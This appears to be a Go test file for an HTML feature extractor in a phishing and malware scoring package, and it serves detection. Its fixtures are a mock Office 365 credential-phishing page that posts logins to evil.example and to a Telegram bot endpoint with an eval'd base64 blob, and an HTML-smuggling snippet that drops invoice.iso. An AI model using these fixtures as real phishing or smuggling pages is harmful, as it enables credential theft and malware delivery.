package mlscore

import (
	"strings"
	"testing"
)

func TestHTMLVectorMatchesNames(t *testing.T) {
	if got := len(ExtractHTML([]byte("<html></html>"))); got != DimHTML {
		t.Fatalf("vector %d, names %d", got, DimHTML)
	}
	if len(ExtractHTML(nil)) != DimHTML {
		t.Fatal("empty input")
	}
}

func feat(t *testing.T, page, name string) float64 {
	t.Helper()
	x := ExtractHTML([]byte(page))
	for i, n := range HTMLFeatureNames {
		if n == name {
			return x[i]
		}
	}
	t.Fatalf("no feature %s", name)
	return 0
}

func TestHTMLFeaturesSeeWhatTheyName(t *testing.T) {
	kit := `<!DOCTYPE html><html><head><title>Microsoft Office 365 - Sign in</title></head><body>
<form action="https://evil.example/next.php" method="post"><input type="email" name="u">
<input type="password" name="p"><input type="hidden" name="t" value="x"></form>
<script>var d=atob("` + strings.Repeat("QUJD", 60) + `");eval(d);window.location.href="https://x.example/";</script>
<script>$.ajax({type:"POST",url:"https://api.telegram.org/bot1/sendMessage"})</script></body></html>`
	for name, want := range map[string]float64{"password_inputs": 1, "email_inputs": 1, "hidden_inputs": 1,
		"form_action_abs": 1, "form_action_php": 1, "title_brand": 1, "eval": 1, "atob": 1, "telegram_api": 1,
		"has_doctype": 1, "scripts": 2} {
		if got := feat(t, kit, name); got != want {
			t.Errorf("%s = %v, want %v", name, got, want)
		}
	}
	if feat(t, kit, "longest_b64") < 200 || feat(t, kit, "location_assign") < 1 || feat(t, kit, "ajax_post") < 1 {
		t.Error("base64, redirect or ajax post not seen")
	}
	smuggle := `<html><body><script>var b=new Blob([u],{type:"application/octet-stream"});var a=document.createElement("a");
a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click();</script></body></html>`
	if feat(t, smuggle, "blob_api") < 2 || feat(t, smuggle, "download_attr") < 1 {
		t.Error("HTML smuggling not seen")
	}
	if feat(t, "<html><title>bcabcabc</title></html>", "title_brand") != 0 {
		t.Error("a short brand inside a word")
	}
}

func TestLooksHTML(t *testing.T) {
	for _, c := range []struct {
		b    string
		path string
		want bool
	}{
		{"\xef\xbb\xbf  <!DOCTYPE html><html>", "", true},
		{"<script>alert(1)</script>", "", true},
		{"anything", "C:\\Users\\a\\Downloads\\invoice.HTM", true},
		{"<svg xmlns=...>", "", true},
		{"MZ\x90\x00", "", false},
		{"#!/bin/sh\necho", "/tmp/x.sh", false},
		{"plain text <html> later", "", false},
	} {
		if got := LooksHTML([]byte(c.b), c.path); got != c.want {
			t.Errorf("LooksHTML(%q, %q) = %v", c.b, c.path, got)
		}
	}
}

func FuzzExtractHTML(f *testing.F) {
	f.Add([]byte("<html><form action=x><input type=password></form><script>eval(atob('QQ=='))</script>"))
	f.Fuzz(func(t *testing.T, b []byte) {
		if len(ExtractHTML(b)) != DimHTML {
			t.Fatal("dim")
		}
	})
}
